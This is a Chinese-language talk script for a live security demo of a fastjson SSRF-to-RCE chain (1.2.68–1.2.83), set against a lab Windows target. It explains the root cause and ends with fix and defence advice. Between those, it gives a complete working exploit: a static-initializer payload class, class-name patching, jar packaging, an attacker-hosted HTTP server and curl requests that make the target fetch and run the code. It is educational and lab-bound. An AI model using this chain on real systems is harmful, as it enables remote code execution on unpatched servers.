---
title: 分享演讲稿
date: 2026-11-13
---

# 分享讲稿：SSRF 到 RCE

 配套材料（讲的时候投屏用）
 - `REPORT-SSRF-TO-RCE.md` —— 讲原理时翻，第 1/2/3 节
 - `handson/SSRF-RCE.md` —— 动手时对照，第 3～9 节（链一）、10～15 节（链二）

 场景：Windows 跑靶机 `192.168.244.1:18086`，虚机当攻击者 `192.168.244.131`
 总时长约 18 分钟。标了【可删】的段落整段跳过就是 12 分钟版。

---

## 开场：先给结果（0:00 – 0:40）

【动作】两个窗口并排放好：左边虚机终端，右边 Windows 靶机。靶场已经在跑。

大家好。今天这个分享，我先给结果，再讲为什么。

我这边这台是攻击机，Linux。那边那台是靶机，Windows，跑着一个 Spring Boot 应用，JDK 8，fastjson 1.2.83，全是默认配置。

等一下我在这边发一个请求过去，那边那台机器的桌面上会弹出一个计算器。

【停顿】

需要先说明一点：**我没有给靶机传任何文件**。是它自己到我这儿来取的。

这就是今天要讲的这条链——SSRF 到 RCE。

---

## 一、这个漏洞是什么（0:40 – 3:30）

【动作】切到报告第 1 节。

先看档案。

| 项 | 值 |
|---|---|
| 组件 | fastjson 1.x |
| 受影响 | **1.2.68 到 1.2.83** |
| 修复 | 1.2.84 |
| 评分 | CVSS 9.0 |

版本这里请注意：是**一个区间**，不是某一个点。

以前 fastjson 的那些编号，1.2.42、1.2.47，都是"上一个补丁没打全"，修完就没了。而 1.2.68 这次引入的问题，是**设计本身有问题**，所以整段版本都带着它。只要线上跑的是这个区间里的任意一个版本，问题一模一样。

【动作】切到报告 1.3 的对比表（官方原话在 1.1，被追问"官方怎么说"时翻那里）。

这个漏洞和以前那些最大的区别，用一张表就能说清：

| | 1.2.67 及以前 | 1.2.68 ~ 1.2.83 |
|---|---|---|
| 攻击者要解决的 | 找一个目标已有的、能打的类 | **自己写一个类** |
| 第三方依赖 | CommonsCollections、JdbcRowSetImpl… | **零** |
| 执行阶段出网 | JNDI 类要回连 | **完全不出网** |

以前打 fastjson，payload 是"一段 JSON"，能打成什么样，取决于目标装了哪些库——所以复现经常靠运气。

这次的 payload 是"一段 class"，代码是我自己写的。目标装了什么，不重要。

还有两个"不需要"，容易被误解：

**不需要开 autoType。** 很多人以为 `autoTypeSupport=false` 就安全了。这里不是。
**不需要目标能出网。** 执行那一段完全在本地，没有任何反连。

那需要什么？两个条件：目标用 fastjson 解析了我能影响的内容，并且请求体里有 `@type`。再加一个前提——得有一个 jar 能被 `jar:` 寻址，这个后面讲。

一句话概括整条链，请记住这句，后面所有内容都围着它转：

> **SSRF 负责把字节搬到目标那儿，fastjson 负责把字节变成一个正在运行的类。**
> 前半段是投递手段，后半段才是漏洞本体。

---

## 二、成因：为什么拦不住（3:30 – 9:00）

### 1. 入口（3:30）

【动作】切到报告 2.1。

`DefaultJSONParser` 第 1764 行：

```java
if (key == JSON.DEFAULT_TYPE_KEY && ...) {
    String typeName = lexer.scanSymbol(symbolTable, '"');   // 1765 原样取出
    Class<?> clazz = config.checkAutoType(typeName, ...);   // 1767
```

`@type` 的值取出来之后，**不校验、不转义、不禁字符**。后面所有问题，都建立在这个前提上——它从来没被当成不可信输入。

### 2. 四道闸，一道都没拦住（4:00）

【动作】切到报告 2.2 的表格。

`checkAutoType` 进去之前有四道检查，看起来很严密：

SafeMode 开关、长度 `3 ≤ len < 192`、首末字符哈希、黑名单哈希。

我们的类名长度合规，首字符是 `j`，也不在任何黑名单里。

第四道最值得说：**黑名单枚举的是"类的集合"，我给的是一段"路径字符串"**。两者不在同一个维度上。这也解释了为什么这个漏洞不能靠"再加几个类名"修掉。

### 3. 核心缺陷（5:00）★ 全场最重要的一段

【动作】切到报告 2.3，指那 20 行。

```java
String resource = typeName.replace('.', '/') + ".class";        // 1482
is = defaultClassLoader.getResourceAsStream(resource);          // 1484
ClassReader classReader = new ClassReader(is, true);            // 1489
classReader.accept(visitor);                                    // 1492
jsonType = visitor.hasJsonType();                               // 1493
```

这四行在做一件事：**判断这个类型可不可信**。

它是怎么判断的？把这个名字当成资源路径，去读它的字节，看看字节里有没有一个注解。

换句话说——**判断"是否可信"的动作，本身执行了一次加载。**

这就是整个漏洞的核心。不是某一行写错了，而是这个设计从根上就有问题。

再看 1482 行那个 `replace('.', '/')`。它把点号还原成斜杠，于是 `jar:file:.C:.fj...` 变成 `jar:file:/C:/fj/...`。协议头那个冒号一直保留着，而 `getResourceAsStream` 遇到长得像 URL 的名字，会走 URL 处理。

**这一步就是 SSRF 的来源，也是后面 `defineClass` 的字节来源。**

顺便说一句：1494 行 catch 之后什么都不打。所以探测阶段**零日志**。目标已经替你把任意地址打开了，日志里干干净净。

### 4. 自签的通行证（6:30）

【动作】切到报告 2.4。

判定逻辑在 `TypeCollector`，展开之后只有一行有效代码：

```java
if ("Lcom/alibaba/fastjson/annotation/JSONType;".equals(desc)) {
    jsonType = true;
}
```

**注解表里出现那 42 个字符，就算可信。**

不看来历、不看加载器、不看这个类是谁写的、也不看注解的实现是什么。

这就是我为什么在载荷里放了一个 `@JSONType`，以及为什么本地还要写一份"假的"注解——一会儿现场会看到。

一个自签的通行证，抵掉了三道针对危险类的检查。

【动作】切到报告 2.5。

`ParserConfig` 1510 行，`jsonType` 为真时**直接 return**。下面 1513 行那段"ClassLoader / DataSource 不许加载"的加固，永远执行不到。

这不是绕过，是走了另一条分支——代码认为"带 `@JSONType` 的类是作者自己标的，不用再查"。

### 5. 最后两道门（7:30）

【动作】切到报告 2.6。

`TypeUtils.loadClass` 把类名原样交给加载器，最后到 JVM：

```java
defineClass("jar:file:/C:/fj/uploads/imp!/Evil", bytes, 0, bytes.length);
```

JVM 有一条强制校验：**你请求的名字，必须和 class 文件里 `this_class` 自称的名字逐字相同。**

不一样就报 `wrong name`。

所以载荷必须改字节里的 `this_class`——让这个类**自称**叫那串路径。它从此只有一个合法身份：目标磁盘上那个 jar 的地址。

【动作】切到 2.7。

`loadClass` 成功只是拿到 `Class` 对象，`static` 块还没跑。真正的执行发生在后面实例化的那一刻——类的首次主动使用触发初始化，`<clinit>` 执行。

**这一步是 JVM 的正常行为，不是缺陷。** 问题在于：谁有资格让这段字节，变成目标进程里的一个类。

### 小结（8:30）

整条链走一遍：

```text
@type 字符串            ← 我控制
  → 点转斜杠 + .class    变成一次合法 URL
  → getResourceAsStream  目标替我打开
  → ASM 扫注解           看到我自己签的 @JSONType
  → 判定"可信"
  → loadClass
  → defineClass          JVM 按 this_class 校验
  → <clinit>             代码执行
```

这条链上**没有一处"绕过"，也没有一处逻辑错误**。

是检查本身就在做加载，而"可信"的凭证，由被检查的对象自己签发。

记住这两句，后面被问到"为什么打了这么多年还在打"，就是这个原因。

---

## 三、复现：链一（9:00 – 15:30）

【动作】切到手册第 3 节，同时把虚机终端放大。

### 1. 先讲清楚这个恶意文件是什么（9:00）

【动作】切到手册第 3 节的代码块（投屏给大家看，虚机上还没写）。

这就是我一会儿要在虚机上写的文件。三十行，只有三个东西值得看。

**第一个，`static {}` 块。**

```java
static {
    ...
    new ProcessBuilder("calc.exe").start();
}
```

这里没有 main，也不需要谁来 new 它。**类被加载的那一刻，它自己就跑。**

这是整件事最关键的一句：**被加载，就是被执行。** 所以"投递载荷"这四个字，等于"把这段字节送到目标 JVM 能加载到的地方"。

顺便说个坑：这个块里读类加载器，我写的是 `Thread.currentThread().getContextClassLoader()`，不能写 `EvilEx.class.getClassLoader()`。远程加载时，`ldc` 解析自己的类名会失败，`static` 跑到一半抛异常，看起来就像"没执行"。

**第二个，`@JSONType`。**

```java
@JSONType
public class EvilEx extends Exception {
```

就是刚才那 42 个字符的通行证。没有它，请求停在 `autoType is not support.`。

**第三个，`extends Exception`。**

这不是随手写的。它决定了 fastjson 用哪个反序列化器：普通类走 ASM 生成的反序列化器，实例化时会拿斜杠形式的内部名再解析一次类；继承 `Throwable` 走反射，手里已经有 `Class` 对象，不再按名找第二次。

后面链二会讲这个差别为什么致命。

还有两个配角：

**桩注解** `com/alibaba/fastjson/annotation/JSONType.java`。虚机上没有 fastjson，编译不过，所以放一份"假"的让 javac 通过。它必须写 `@Retention(RUNTIME)`——默认是 CLASS，不写进 class 文件，运行时通行证就没了。

**改名脚本** `patch_name.py`。把 class 常量池里 `this_class` 那条字符串换掉。改完这个类就"自称"叫那串路径了。

### 2. 现场写（10:30）

【动作】开始敲，一条一条来，别粘一大段。每条敲完念一句在干什么。

```bash
cd ~/ssrf
mkdir -p com/alibaba/fastjson/annotation
```

先写载荷：

```bash
cat > EvilEx.java <<'JAVA'
import com.alibaba.fastjson.annotation.JSONType;

@JSONType
public class EvilEx extends Exception {

    public EvilEx() { super("poc"); }
    public EvilEx(String m) { super(m); }

    static {
        StringBuilder sb = new StringBuilder();
        sb.append("CVE-2026-16723 single-stage (jar:http dot-form)\n");
        sb.append("user   : ").append(System.getProperty("user.name")).append("\n");
        sb.append("java   : ").append(System.getProperty("java.version")).append("\n");
        sb.append("loader : ").append(Thread.currentThread().getContextClassLoader()).append("\n");
        try {
            java.nio.file.Files.write(
                java.nio.file.Paths.get("C:/fj/rce-proof-http.txt"),
                sb.toString().getBytes("UTF-8"));
        } catch (Throwable ignored) {
        }
        try {
            new ProcessBuilder("calc.exe").start();
        } catch (Throwable ignored) {
        }
    }
}
JAVA
```

"这段 `static` 只做两件事：写一个证明文件、弹一次计算器。不反弹 shell、不持久化。"

再写桩注解：

```bash
cat > com/alibaba/fastjson/annotation/JSONType.java <<'JAVA'
package com.alibaba.fastjson.annotation;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.TYPE)
public @interface JSONType {
}
JAVA
```

编译：

```bash
mkdir -p classes
javac --release 8 -nowarn -d classes EvilEx.java com/alibaba/fastjson/annotation/JSONType.java
cp classes/EvilEx.class clean2.class
```

"`--release 8` 不能省。靶机是 JDK 8，class 版本必须是 52，我本机的 javac 是 21，漏了这个参数就是 65，打过去直接 `UnsupportedClassVersionError`。"

### 3. 改名（11:30）

```bash
IP=$(hostname -I | awk '{print $1}')
IFS=. read a b c d <<< "$IP"
DEC=$((a*16777216 + b*65536 + c*256 + d))
echo "IP=$IP  DEC=$DEC"
```

"这里必须两个数都有：点分地址给 curl 用，十进制给类名用。"

```bash
NAME='jar:http://'"$DEC"':19090/impe!/EvilEx'
python3 patch_name.py clean2.class "$NAME" classes/EvilEx.class
javap -v -p classes/EvilEx.class | grep this_class
```

【动作】把输出指给大家看。

```text
类名: EvilEx -> jar:http://3232298115:19090/impe!/EvilEx
  this_class: #92  // "jar:http://3232298115:19090/impe!/EvilEx"
```

"这一步为什么必须做？因为 JVM 要校验名字。类文件里得写着它自己叫这个 URL，否则报 `wrong name`。"

三条规则，一次说清：

| 位置 | 写什么 |
|---|---|
| jar 里的条目名 | `EvilEx.class` |
| 字节里的 `this_class` | `jar:http://<DEC>:19090/impe!/EvilEx` |
| 我发的 `@type` | `jar:http:..<DEC>:19090.impe!.EvilEx` |

"`@type` 三个点号，`this_class` 三个斜杠，是同一样东西。IP 必须十进制——因为 fastjson 会把 `@type` 里所有点都换成斜杠，写 `192.168.244.131` 会被拆成 `192/168/244/131`，地址直接废掉，报错还只显示 `autoType is not support`，看不出是地址坏了。"

### 4. 打包（12:20）

```bash
python3 -c "
import zipfile, os
z = zipfile.ZipFile('impe', 'w', zipfile.ZIP_DEFLATED)
z.write('classes/EvilEx.class', 'EvilEx.class')
z.close()
print(os.path.getsize('impe'), zipfile.ZipFile('impe').namelist())"
```

```text
1105 ['EvilEx.class']
```

"为什么非要打包？因为 `jar:` 这个协议不认 class，只认 zip。它要去中央目录里找条目，裸 class 文件连解析都过不去——我实测过，同一个名字、同样的路径，裸文件取字节直接是空，打成 zip 之后才读得到。"

"而且 zip 给了两层名字：条目名是 `EvilEx.class`，类名可以是那串 URL。这就是为什么文件名不用改，改的只是它自称的名字。"

### 5. 起服务（12:50）

【动作】新开一个终端，或者用 `&`（如果习惯）。建议单独窗口，因为一会儿要看日志。

```bash
cd ~/ssrf
python3 -m http.server 19090 --bind 0.0.0.0
```

"必须在这个目录起，否则 `/impe` 是 404。"

### 6. 打（13:10）

【动作】回到第一个终端。

```bash
curl -s 'http://192.168.244.1:18086/trace?type=jar:http:..3232298115:19090.impe!.EvilEx&step=parse'; echo
```

【动作】说完这句再回车，留 1 秒给大家看结果。

```json
{"type":"jar:http:..3232298115:19090.impe!.EvilEx","jsonParse":"...","instance":"..."}
```

"同时看三个地方。"

【动作】依次指出，中间停两秒。

**第一，`http.server` 那个窗口。** 多了一条：

```text
192.168.244.1 - - "GET /impe HTTP/1.1" 200 -
```

`192.168.244.1` 是靶机。**它主动到我这儿来取文件的。** 这就是 SSRF 在链一里的位置——不是我推给它，是它自己拉。

**第二，靶机桌面。** 计算器弹出来了。这个计算器是靶机的，不是虚机的，`calc.exe` 是 Windows 的进程。

**第三，proof 文件。**

```bat
type C:\fj\rce-proof-http.txt
```

```text
CVE-2026-16723 single-stage (jar:http dot-form)
user   : MECHREVO
java   : 1.8.0_66
loader : org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c
```

"`loader` 这行是最硬的证据。`LaunchedURLClassLoader` 是 Spring Boot 启动器里的类加载器，只存在于靶机那个 JVM 里，我这台虚机给不出来。"

### 7. 复盘这条链（14:40）

【动作】切回报告第 4 节。

"整条链，一个请求，我发了什么？"

```json
{"@type":"jar:http:..3232298115:19090.impe!.EvilEx"}
```

"就这一行。靶机拿到之后：

1. 把点还原成斜杠，拼出 `jar:http://3232298115:19090/impe!/EvilEx.class`；
2. 自己发一个 GET 去取——**这一步就是 SSRF**；
3. 字节拿回来，ASM 看到我自己签的 `@JSONType`，判定可信；
4. `defineClass`，类名对得上；
5. 实例化，`<clinit>` 执行，计算器。

靶机磁盘上**没有多出任何 jar**。它只是在自己的临时目录里缓存了一份，用完就扔。"

"这条链漂亮在省事，但它有一个前提——载荷必须继承 `Throwable`。为什么？下面这条链就是为了解决这个前提。"

---

## 四、链二：为什么最后只能 `jar:file`（15:30 – 18:00）

【动作】切到报告 4.1、4.2。

### 1. 换个载荷会怎样（15:30）

刚才那个类，我写的是 `extends Exception`。如果我老老实实写一个普通类——`public class Evil { }`，没有父类——同样的名字、同样的请求，结果是这样：

```text
NoClassDefFoundError: jar:http://.../imp4!/Evil
    at FastjsonASMDeserializer_1_Evil.createInstance
```

注意它失败的位置：不是加载失败，是**实例化**失败。

原因在这一行：fastjson 给普通类生成了一个 ASM 反序列化器，里面的 `new` 指令写的是**斜杠形式的内部名**——`jar:http://...`。JVM 拿这个名字再解析一次，可这时候网络流已经关了，取不到字节。

而 `Throwable` 子类走反射，`clazz.newInstance()`，手里已经有 `Class` 对象，不需要第二次按名解析。

所以准确的说法是：**能定义，但走不完。** 卡在"再读一次"。

### 2. 那第二次读，从哪来（16:20）

只要字节能被读第二次，这条路就通了。

Linux 上有个现成的：JVM 用 `jar:http://` 拉远程 jar 时，会缓存成 `/tmp/jar_cache*.tmp`，**文件句柄一直开着**。fd 指向的是文件，不是一次性网络流。

```text
@type = jar:http:..attack.er.19090.p!.Exception    → JVM 自己下载、自己缓存
@type = jar:file:.proc.self.fd.N!.Exception        → 指着那个 fd，第二次读也命中
```

这就是官方公告敢说"唯一前置条件是 fat-jar"的底气——投递由 JVM 自己完成，目标连上传功能都不需要。

但 Windows 没有 `/proc/self/fd`，`jar_cache` 文件名又是随机的，指不过去。

所以在 Windows 上，想让字节可重读，只剩一个办法：**真的写一份到磁盘上。**

这就是链二。`/import` 这个端点做的事很朴素——给它一个 URL，它去取，然后存到 `C:\fj\uploads\`。

### 3. 现场打（17:00，时间紧可只讲不跑）

【准备】`payloadf` 必须提前按手册第 10～13 步做好（`Evil.java` 编译 → 改名成 `jar:file:/C:/fj/uploads/imp!/Evil` → 打包）。没做的话这一段只能讲，不能跑。

```bash
IP=$(hostname -I | awk '{print $1}')
curl -s "http://192.168.244.1:18086/import?url=http://$IP:19090/payloadf&name=imp"
```

```json
{"fetched":"http://192.168.244.131:19090/payloadf",
 "saved":"C:\\fj\\uploads\\imp","bytes":1060,
 "typeName":"jar:file:.C:.fj.uploads.imp!.Evil"}
```

"看 `http.server` 的日志，又是一条来自 `192.168.244.1` 的 GET。**真正意义上的 SSRF 在这里**——目标收到一个 URL，自己去访问，把结果写到自己磁盘上。"

"然后触发，就一步："

```bash
curl -s 'http://192.168.244.1:18086/trace?type=jar:file:.C:.fj.uploads.imp!.Evil&step=parse'; echo
```

"计算器再弹一次。这条链里执行那一段和刚才**一模一样**，唯一的区别是字节从哪来。"

### 4. 为什么最后只能 `jar:file`（17:40）★

这是今天最后一个技术点，三条约束叠起来，最后只剩一个答案。

**第一条，类名不能含斜杠。**

JVM 的 `checkName` 就一句话：

```java
if (name.indexOf('/') != -1 || name.charAt(0) == '[') return false;
```

纯字符串判断。所以 `@type` 必须全点号写，斜杠写法在任何 JDK 上都是 `IllegalName`。

**第二条，点号化会毁掉 URL 里的地址。**

`@type` 里所有点都会被换成斜杠，所以点分 IP 写不出来——只能写十进制，或者 `localhost`。这一步是能做，但它意味着远程路径的构造非常脆弱：IP 一变，载荷就得重新打包。

**第三条，字节要能被读第二次。**

远程那个流是一次性的，实例化的时候已经关了。要么有文件、要么有 fd。

三条合起来：

| 约束 | `jar:http:..` | `jar:file:` |
|---|---|---|
| 类名不能含 `/` | 可以（写十进制 IP） | 可以（路径本来就点号化） |
| 地址稳定 | ❌ IP 一变就得重打包 | ✅ 类名里没有 IP |
| 字节可重读 | ❌ 网络流一次性 | ✅ 文件可以反复打开 |

**所以 `jar:file` 是唯一同时满足这三条的形态。** 它不挑 JDK 版本、不挑载荷形态、不依赖 IP。

再补一句关于 JDK 版本的：这事跟版本不是完全无关。JDK 9 以上对类名的处理更严——我拿 21 测过，斜杠形式直接 `ClassFormatError`。点号形式我只在 8u66 上完整验证过，没有在 21 上跑到最后。

所以稳妥的讲法是：**新版本上不要赌点号形式能不能过，直接走 `jar:file`**——这也是很多分析文章把两阶段说成"高版本方案"的原因。

一句话收束这一节：

> **`jar:http` 是省事的版本，`jar:file` 是通用的版本。省事的那条靠"载荷继承 Throwable"撑着，通用的那条不挑。**

---

## 五、收尾（18:00 – 18:40）

【动作】切到报告第 8 节。

三句话，结束今天的内容。

**第一，加了校验不等于校验有效。** 四道闸看起来严密，但它们检查的都是"类的名字"，我塞进去的是一段"路径语法"。维度不对，再多闸也没用。

**第二，任何"自声明即可信"的机制，在被检查对象可控时都会失效。** `@JSONType` 是这样，各种 `trusted=true` 的元数据也是这样。这是同一个错误。

**第三，修复要修在入口的语法上。** 1.2.84 只加了 4 行：

```java
if (TypeUtils.hasIllegalTypeNameChars(typeName)) {
    throw new JSONException("autoType is not support. " + typeName);
}
// 内部：typeName.indexOf(':') >= 0 || typeName.indexOf('!') >= 0
```

关键是**位置**——它在探测之前。所以 `jar:` 一出现就被拒，连读字节都到不了。

防守上最有效的一条，其实不是升级，是架构：**上传目录不能被类加载器寻址。** 这一条对本漏洞和以后所有同类问题都有效。

最后回到开头那句话：

> 这个漏洞最值得记住的，不是它怎么打。
> 是那句——**判断"是否可信"的动作，本身执行了一次加载，而通行证由被检查对象自己签发。**

谢谢，有问题我们讨论。

---
---

# 附：台上保命清单

## A. 开场前 10 分钟

| 检查 | 命令 / 动作 | 期望 |
|---|---|---|
| 靶机起来了 | Windows：`cd /d C:\fj` → `java -jar app2.jar --server.port=18086` | 窗口不关 |
| 靶机是干净的 | **重启一次靶场**（一个类名在一个 JVM 里只执行一次） | 避免演示时 `ok:true` 却不弹窗 |
| 清掉旧证据 | `del C:\fj\rce-proof-http.txt` | 演示时看到的是新写的 |
| 虚机 IP | `hostname -I` | 记下点分和 `DEC` 两个值 |
| HTTP 服务 | `cd ~/ssrf && python3 -m http.server 19090 --bind 0.0.0.0` | 单独窗口，一会儿要看日志 |
| 自检 | `curl -s -o /dev/null -w "%{http_code}\n" "http://$IP:19090/impe"` | `200` |
| 连通性 | `curl -s -o /dev/null -w "%{http_code}\n" http://192.168.244.1:18086/status` | `200` |

## B. 卡住时的三条兜底

| 现象 | 大概率原因 | 一句话处理 |
|---|---|---|
| 命令敲完什么都不打印 | 粘多行被拆断，或 POST 被安全软件 RST | 改用单行 GET `/trace?...&step=parse`，`set +H` 关历史展开 |
| `ok:true` 但没弹窗 | 类名被缓存，`<clinit>` 没重跑 | 重启靶场，或换 `impe2` 重打包 |
| `stream=false` / `autoType is not support` | 类名里有点分 IP，或 jar 没起在正确目录 | 检查 `DEC` 是否为空、`http.server` 是否在 `~/ssrf` |

## C. 预判追问（一句话答法）

**"这不就是老的 fastjson 反序列化吗？"**
同一个家族，攻击模型变了：老的是在目标已有类里挑一个能打的，这个是"我自己写一个类给你加载"。

**"SSRF 是必须的吗？"**
不是。SSRF 只是投递方式之一，等价于"目标有个上传功能"。它的价值在于目标没有上传入口、但有"填 URL 帮你下载"这类功能时，仍然能完成投递。

**"关掉 autoType 是不是就没事了？"**
不是。`jsonType` 为真时条件已经成立，默认配置下这条路完全畅通。这是这个漏洞最容易被误判的地方。

**"为什么演示用 GET 不用 POST？"**
同一个入口，`/trace?step=parse` 内部就是 `JSON.parse`。用 GET 是实操原因——我这台机器上 POST 会被安全软件重置。

**"能不打 jar、直接给个 class 吗？"**
不行。`jar:` 协议只认 zip，裸 class 连条目都找不到，`getResourceAsStream` 直接返回空。打包不是为了压缩，是为了能被寻址。

**"为什么不能直接 `jar:http://`，非要落地？"**
两条路都能通，区别在载荷形态：继承 `Throwable` 就能一条 JSON 打完；普通类会二次按名解析，网络流已经关了，必须换成可重读的字节源——本地文件，或者 Linux 的 `/proc/self/fd`。

## D. 时间不够时删哪里

按顺序删，删到 12 分钟：

1. 第三部分第 7 小节「复盘这条链」的口头展开（保留结论一句）
2. 第四部分第 3 小节「现场打链二」——只讲结构，不跑命令
3. 第二部分第 4 小节「自签的通行证」的细节，只留一句"只要注解表里有那 42 个字符就算可信"
4. 附录 C 全部不讲，留着自己接招
